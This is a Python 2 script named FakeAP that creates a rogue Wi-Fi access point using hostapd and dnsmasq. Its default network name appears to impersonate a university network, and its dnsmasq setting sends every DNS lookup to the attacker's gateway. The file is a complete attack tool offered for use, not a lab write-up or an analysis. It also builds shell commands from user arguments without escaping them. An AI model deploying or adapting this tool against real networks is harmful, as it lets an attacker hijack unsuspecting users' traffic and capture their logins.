#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
import fcntl
import os
import sys
import re
import socket
import time
import struct
from subprocess import Popen, PIPE, check_output

NETWORK_IP = "10.0.0.0"
NETWORK_MASK = "255.255.255.0"
NETWORK_GW_IP = "10.0.0.1"
DHCP_LEASE = "10.0.0.2,10.0.0.100,12h"

DN = open(os.devnull, 'w')


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-c",
        "--channel",
        help="set AP-channel from 1 to 16 (1 by default)",
        default="1"
    )
    parser.add_argument(
        "-i",
        "--interface",
        help="wireless interface (e.g. -i wlan0)"
    )
    parser.add_argument(
        "-e",
        "--essid",
        help="set essid ('web.wlan.bjtu' by default)"
    )
    parser.add_argument(
        "-t",
        "--time",
        help="restart time (second) (300 by default)"
    )
    return parser.parse_args()


def get_hostapd():
    if not os.path.isfile('/usr/sbin/hostapd'):
        install = raw_input(
            ('[*] hostapd not found ' +
             'in /usr/sbin/hostapd, install now? [y/n] ')
        )
        if install == 'y':
            os.system('apt-get -y install hostapd')
        else:
            sys.exit(('[-] hostapd' +
                      'not found in /usr/sbin/hostapd'))
    if not os.path.isfile('/usr/sbin/hostapd'):
        sys.exit((
            '\n[-] Unable to install the \'hostapd\' package!\n' +
            '[*] This process requires a persistent internet connection!\n' +
            'Please follow the link below to configure your sources.list\n' +
            'http://docs.kali.org/general-use/kali-linux-sources-list-repositories\n' +
            '[+] Run apt-get update for changes to take effect.\n' +
            '[+] Rerun the script again to install hostapd.\n' +
            '[!] Closing'
        ))


def shutdown(exit=True):
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('pkill airbase-ng')
    os.system('pkill dnsmasq')
    os.system('pkill hostapd')
    if os.path.isfile('/tmp/hostapd.conf'):
        os.remove('/tmp/hostapd.conf')
    reset_interfaces()
    print '\n[!] Reset system config'
    if exit:
        sys.exit(1)


def get_interfaces():
    interfaces = {"monitor": [], "managed": [], "all": []}
    proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0:
            continue  # Isn't an empty string
        if line[0] != ' ':  # Doesn't start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search:  # Isn't wired
                iface = line[:line.find(' ')]  # is the interface
                if 'Mode:Monitor' in line:
                    interfaces["monitor"].append(iface)
                elif 'IEEE 802.11' in line:
                    interfaces["managed"].append(iface)
                interfaces["all"].append(iface)
    return interfaces


def reset_interfaces():
    monitors = get_interfaces()["monitor"]
    for m in monitors:
        if 'mon' in m:
            Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
        else:
            Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
            Popen(['iwconfig', m, 'mode', 'managed'], stdout=DN, stderr=DN)
            Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)


def get_mac(mon_iface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    print ('[*] Monitor mode: ' + mon_iface + ' - ' + mac)
    return mac


def start_ap(mon_iface, channel, essid, args=None):
    print '[*] Starting the fake access point...'
    config = (
        'interface=%s\n'
        'driver=nl80211\n'
        'ssid=%s\n'
        'hw_mode=g\n'
        'channel=%s\n'
        'macaddr_acl=0\n'
        'ignore_broadcast_ssid=0\n'
    )
    with open('/tmp/hostapd.conf', 'w') as dhcpconf:
        dhcpconf.write(config % (mon_iface, essid, channel))

    os.system('hostapd /tmp/hostapd.conf &')
    time.sleep(5)  # Copied from Pwnstar which said it was necessary?


def dhcp_conf(interface):
    config = (
        'no-resolv\n'
        'interface=%s\n'
        'dhcp-range=%s\n'
        'address=/#/%s'
    )

    with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
        dhcpconf.write(config % (interface, DHCP_LEASE, NETWORK_GW_IP))
    return '/tmp/dhcpd.conf'


def dhcp(dhcpconf, mon_iface):
    os.system('echo > /var/lib/misc/dnsmasq.leases')
    dhcp = Popen(['dnsmasq', '-C', dhcpconf], stdout=PIPE, stderr=DN)
    Popen(['ifconfig', str(mon_iface), 'mtu', '1400'], stdout=DN, stderr=DN)
    Popen(
        ['ifconfig', str(mon_iface), 'up', NETWORK_GW_IP,
         'netmask', NETWORK_MASK
         ],
        stdout=DN,
        stderr=DN
    )
    # Make sure that we have set the network properly.
    proc = check_output(['ifconfig', str(mon_iface)])
    if NETWORK_GW_IP not in proc:
        return False
    time.sleep(.5)  # Give it some time to avoid "SIOCADDRT: Network is unreachable"
    os.system(
        ('route add -net %s netmask %s gw %s' %
         (NETWORK_IP, NETWORK_MASK, NETWORK_GW_IP))
    )
    return True


def start_mode(interface, mode="monitor"):
    print ('[+] Starting ' + mode + ' mode off ' + interface)
    try:
        os.system('ifconfig %s down' % interface)
        os.system('iwconfig %s mode %s' % (interface, mode))
        os.system('ifconfig %s up' % interface)
        return interface
    except Exception:
        sys.exit('[-] Could not start %s mode' % mode)


def run(channel, ap_iface, essid):
    os.system('nmcli radio wifi off')
    os.system('rfkill unblock all')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    mon_iface = get_mac(ap_iface)
    start_ap(ap_iface, channel, essid)

    dhcpconf = dhcp_conf(ap_iface)
    if not dhcp(dhcpconf, ap_iface):
        print('[+] Could not set IP address on %s!' % ap_iface)
        shutdown()
    print ('[*] ' + essid + ' set up on channel ' + channel + ' via ' + mon_iface +
           ' on ' + str(ap_iface))


if __name__ == "__main__":

    print ('   [---]            FakeAP 0.9.1            [---]')
    print ('   [---]        Created by: <i@cdxy.me>     [---]')
    print ('   [---]        Github: noScript/FakeAP     [---]')

    args = parse_args()

    channel = args.channel if args.channel else '1'
    ap_iface = args.interface if args.interface else 'wlan0'
    essid = args.essid if args.essid else 'web.wlan.bjtu'
    restart_time = int(args.time) if args.time else 300

    if os.geteuid():
        sys.exit('[-] Please run as root')

    get_hostapd()

    try:
        while True:
            shutdown(exit=False)
            time.sleep(2)
            run(channel, ap_iface, essid)
            time.sleep(restart_time)
            print('[*] ' + 'Restart hostapd')
    except KeyboardInterrupt:
        shutdown()
